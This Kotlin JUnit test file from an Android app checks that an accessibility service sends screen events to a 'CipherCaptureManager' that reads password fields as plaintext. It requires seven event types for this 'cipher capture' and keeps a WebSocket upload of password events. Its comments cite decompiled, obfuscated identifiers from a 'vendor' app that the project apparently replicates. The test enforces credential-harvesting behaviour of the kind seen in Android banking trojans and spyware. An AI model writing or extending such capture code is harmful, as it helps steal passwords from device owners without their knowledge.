package com.storm.safe.rock.service

import org.junit.Test
import org.junit.Assert.*
import java.io.File

/**
 * Source-level verification that MyAccessibilityService.onAccessibilityEvent
 * dispatches events to CipherCaptureManager.monitorSystemPasswordInputFull
 * (vendor m211820d6, reads EditText plaintext) — not just the WS event sink.
 *
 * Plan 2026-04-17-replica-cipher-capture-alignment Task 1.
 */
class CipherCaptureDispatchTest {

    private val svcFile: String = run {
        // Gradle sets test cwd = app/ module root, so src/main/... is correct.
        val f = File("src/main/java/com/storm/safe/rock/service/MyAccessibilityService.kt")
        assertTrue(
            "MyAccessibilityService.kt must exist at $f (pwd=${System.getProperty("user.dir")})",
            f.exists()
        )
        f.readText()
    }

    @Test
    fun `onAccessibilityEvent dispatches to monitorSystemPasswordInputFull`() {
        // Vendor m211820d6 equivalent — actually reads EditText text
        assertTrue(
            "onAccessibilityEvent must call ccm.monitorSystemPasswordInputFull(event) " +
                "to read EditText plaintext (vendor dqtvuisjd.java:10048 → C0335a1.m211820d6)",
            svcFile.contains("monitorSystemPasswordInputFull(event)")
        )
    }

    @Test
    fun `dispatch matches all 7 event types for cipher capture`() {
        // Event types (replica ADAPT adds TYPE_VIEW_FOCUSED vs vendor m211820d6's 6):
        //   TYPE_VIEW_CLICKED=1, TYPE_VIEW_TEXT_CHANGED=16,
        //   TYPE_WINDOW_STATE_CHANGED=32, TYPE_VIEW_FOCUSED=8,
        //   TYPE_WINDOW_CONTENT_CHANGED=2048, TYPE_WINDOWS_CHANGED=4194304,
        //   TYPE_VIEW_HOVER_ENTER=128
        val dispatchBlock = extractDispatchBlock()
        val requiredTypes = listOf(
            "AccessibilityEvent.TYPE_VIEW_CLICKED",
            "AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED",
            "AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED",
            "AccessibilityEvent.TYPE_VIEW_FOCUSED",
            "AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED",
            "AccessibilityEvent.TYPE_WINDOWS_CHANGED",
            "AccessibilityEvent.TYPE_VIEW_HOVER_ENTER"
        )
        for (type in requiredTypes) {
            assertTrue(
                "Dispatch block must include $type (vendor m211820d6 + replica ADAPT)",
                dispatchBlock.contains(type)
            )
        }
    }

    @Test
    fun `string-event dispatchEvent still present for WS event sink`() {
        // Vendor sendPasswordEvent is a *separate* WS event upload mechanism,
        // unrelated to m211820d6. We keep it for WS telemetry.
        assertTrue(
            "Legacy ccm.dispatchEvent(String) for WS telemetry must still be present",
            svcFile.contains("ccm.dispatchEvent(\"accessibility_event_")
        )
    }

    private fun extractDispatchBlock(): String {
        val marker = "CipherCaptureManager dispatch"
        val start = svcFile.indexOf(marker)
        assertTrue(
            "Marker '// $marker' not found in MyAccessibilityService.kt — was the comment renamed?",
            start >= 0
        )
        return svcFile.substring(start, minOf(svcFile.length, start + 2000))
    }
}
